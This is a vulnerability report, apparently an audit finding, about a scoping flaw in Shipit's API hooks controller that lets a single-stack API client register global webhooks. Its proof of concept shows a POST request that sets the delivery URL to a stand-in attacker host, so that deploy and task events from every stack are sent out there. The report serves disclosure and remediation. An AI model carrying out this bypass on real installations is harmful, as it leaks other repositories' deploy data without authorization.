### Title
API client scoped to a single stack can create/manage global webhooks that deliver events for every stack - ([File: app/controllers/shipit/api/hooks_controller.rb])

### Summary
`Shipit::Api::HooksController` is mounted twice in `config/routes.rb`: once nested under a stack (`/api/stacks/*stack_id/hooks`) and once at the top level (`/api/hooks`). Stack-scoping for `ApiClient` is only enforced inside `BaseController#stack`/`#stacks`, which is only reached when `params[:stack_id]` is present. When an `ApiClient` hits the un-nested route, `HooksController#stack_id` short-circuits to `nil` without ever calling `stack`, so the per-client stack restriction (`current_api_client.stack_id`) is never consulted. An `ApiClient` scoped to one stack but holding `write:hook`/`read:hook` permission can therefore create, read, update, or destroy **global** hooks (`stack_id: nil`), which `Hook.deliver` fans out to every stack in the installation.

### Finding Description
`ApiClient` can be scoped to a single stack: [1](#0-0) 

That scoping is supposed to bound what the client can see/touch: [2](#0-1) 

`require_permission!`/`check_permissions!` only checks the *operation:scope* string (`write:hook`), never the stack the hook is being attached to: [3](#0-2) 

`HooksController` derives the query scope from `stack_id`, which is only computed from `params[:stack_id]` — and only calls the stack-restricting `stack` helper when that param is present: [4](#0-3) 

Both the nested and top-level hook routes exist and map to the same controller: [5](#0-4) 

Global hooks (`stack_id: nil`) are delivered for *every* stack, not just the stack the creating client was scoped to: [6](#0-5) 

The intended binding is: *the stack an `ApiClient.stack_id` authorises == the stack whose events the hook created by that client can touch*. Because the top-level `/api/hooks` route bypasses `stack`/`stacks` scoping entirely, a client scoped to stack A can create a global hook (`stack_id: nil`) that receives `deploy`, `rollback`, `task`, `commit_status`, `merge`, and `pull_request` events for every stack B, C, D, ... in the instance — breaking the equality and giving cross-repository read (event/state exfiltration to an attacker-controlled `delivery_url`) as well as cross-repository "write" in the sense of altering what webhooks fire for repos the client was never authorized to touch.

### Impact Explanation
An attacker holding an `ApiClient` token scoped to a single stack (e.g., a low-trust integration limited to one repository) but granted `write:hook` can register a hook with an attacker-controlled `delivery_url` and `events: [deploy, task, rollback, ...]`. That hook will subsequently receive event payloads (stack/task metadata, commit SHAs, deploy status, diff links, etc.) for **every stack** in the Shipit instance — not just the one it was scoped to — satisfying "unauthorized read of stack state, task streams or deploy output" across stacks/repositories the token was never granted access to. This matches the required High-severity impact category (escalation beyond authorized stack scope / unauthorized read of stack state or deploy output).

### Likelihood Explanation
This only requires possession of a valid `ApiClient` credential that is stack-scoped but has `write:hook` (or even just `read:hook` to list/read existing global hooks and their `delivery_url`/`content_type`/`events`) — no GitHub write access, no admin privileges, and no special timing is needed. The route exists unconditionally (`resources :hooks, ...` at the top level of the `api` namespace), and the bypass is a straightforward, always-reachable code path (simply omit `stack_id` from the request path).

### Recommendation
Enforce stack scoping for hooks the same way `stacks`/`stack` does regardless of whether `params[:stack_id]` is present. Specifically, in `HooksController`, when `current_api_client.stack_id?` is true, reject (403) any request to the un-nested `/api/hooks` endpoints (or force `stack_id` to `current_api_client.stack_id` and disallow creation of global/`stack_id: nil` hooks), and restrict `#index`/`#show` to only return hooks whose `stack_id` is either the client's own scoped stack or fully disallow visibility into other global hooks (secrets, delivery URLs) for scoped clients.

### Proof of Concept
1. Create an `ApiClient` scoped to `stack_id: shipit_stacks(:shipit).id` with permissions `['write:hook']`.
2. Authenticate as that client and issue:
   `POST /api/hooks` with `{ delivery_url: 'https://attacker.example/collect', events: ['deploy','task','rollback','commit_status'] }` (note: no `stack_id` in the path).
3. `HooksController#stack_id` returns `nil` (params[:stack_id] absent) → `hooks` resolves to `Hook.where(stack_id: nil)` → `create` persists a hook with `stack_id: nil`, i.e., global.
4. Any subsequent deploy/task/rollback/commit_status event on **any** stack in the installation (not just the one the client was scoped to) is delivered to `https://attacker.example/collect` via `Hook.deliver` / `for_stack` matching `stack_id: [nil, stack.id]`.
5. Compare with the nested route `POST /api/stacks/<owner>/<repo>/<env>/hooks`, which correctly restricts creation/listing to the client's authorized stack via `BaseController#stack`.

    scope :global, -> { where(stack_id: nil) }
    scope :scoped_to, ->(stack) { where(stack_id: stack.id) }
    scope :for_stack, ->(stack_id) { where(stack_id: [nil, stack_id]) }

    class << self
      def emit(event, stack, payload)
        raise "#{event} is not declared in Shipit::Hook::EVENTS" unless EVENTS.include?(event.to_s)

        Shipit::EmitEventJob.perform_later(
          event: event.to_s,
          stack_id: stack&.id,
          payload: coerce_payload(payload)
        )
        deliver_internal_hooks(event, stack, payload)
      end

      def deliver_internal_hooks(event, stack, payload)
        Shipit.internal_hook_receivers.each do |receiver|
          receiver.deliver(event, stack, payload)
        end
      end

      def deliver(event, stack_id, payload)
        for_stack(stack_id).listening_event(event).each do |hook|
          hook.deliver!(event, payload)
        end
      end
